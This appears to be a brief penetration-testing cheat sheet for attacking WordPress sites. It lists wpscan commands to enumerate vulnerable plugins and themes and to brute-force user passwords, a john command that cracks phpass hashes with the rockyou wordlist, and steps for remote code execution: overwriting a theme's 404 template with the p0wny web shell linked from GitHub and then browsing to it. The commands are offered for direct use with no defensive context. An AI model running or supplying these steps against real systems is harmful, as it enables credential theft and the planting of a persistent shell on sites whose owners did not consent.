# Wordpess

### Enumerating vulnerable plugins

```
wpscan --url targethost.com.br --api-token TOKEN --enumerate vp --plugins-detection aggressive
```

### Enumerating vulnerables themes

```
wpscan --url targethostt.com.br --api-token TOKEN --enumerate vt --plugins-detection aggressive
```

### Breaking md5 hash (possible wordpress hash) with john

```
john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt hash
```

```
# Scan
wpscan --rua -e --url <URL>

# Brute force user(s)
wpscan --rua --url <URL> -P <PASSWORDS_LIST> -U "<USER>,<USER>"
```

### **Wordpress panel RCE**

```
Modifying a php from the theme used (admin credentials needed)

Appearance -> Editor -> 404 Template (at the right)
Change the content for a php shell
https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
http://<IP>/wp-content/themes/twentytwelve/404.php
```
